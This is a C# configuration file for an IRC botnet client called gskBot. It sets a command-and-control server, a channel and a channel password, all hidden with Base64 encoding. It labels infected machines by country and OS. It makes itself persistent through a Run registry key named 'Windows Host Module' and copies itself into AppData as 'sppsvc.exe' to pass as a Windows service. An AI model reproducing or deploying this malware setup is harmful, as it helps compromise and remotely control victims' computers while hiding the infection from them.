#region Imports
using System;
using System.Diagnostics;
#endregion

namespace gskBot {
    class Config {
        #region Connection Settings
        public static string Server     = Function.Base64Decode("aXJjLnN1cGVybmV0cy5vcmc="); // irc.supernets.org
        public static string Channel    = Function.Base64Decode("I2hhcmJvcg==");             // #harbor
        public static string ChannelKey = Function.Base64Decode("QmFiQ2FkeTE5OTU=");         // BabCady1995
        public static int    Port       = 6697;
        #endregion

        #region Bot Settings
        public static string ID         = Function.RandomStr(6).ToUpper();
        public static string Nick       = Function.GetCountryCode() + "|" + Function.GetOS() + "-" + Function.GetMachineType() + "|" + ID;
        public static string AdminHost  = Function.Base64Decode("c3VwZXIubmV0cw==");
        #endregion

        #region Startup Settings
        public static bool Persistance      = true;
        public static bool Startup          = true;
        public static string StartupKeyName = "Windows Host Module";
        public static string StartupKeyDir  = @"Software\Microsoft\Windows\CurrentVersion\Run";
        public static string AppData        = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string InstallFile    = AppData + @"\Microsoft\Windows\Services\sppsvc.exe";
        #endregion

        #region Other Settings
        public static bool   Debug           = false;
        public static int    ConnectionDelay = 30000;
        public static int    ReconnectDelay  = 300000;
        public static string SelfPath        = Process.GetCurrentProcess().MainModule.FileName;
        public static string Version         = "1.0.0";
        #endregion
    }
}
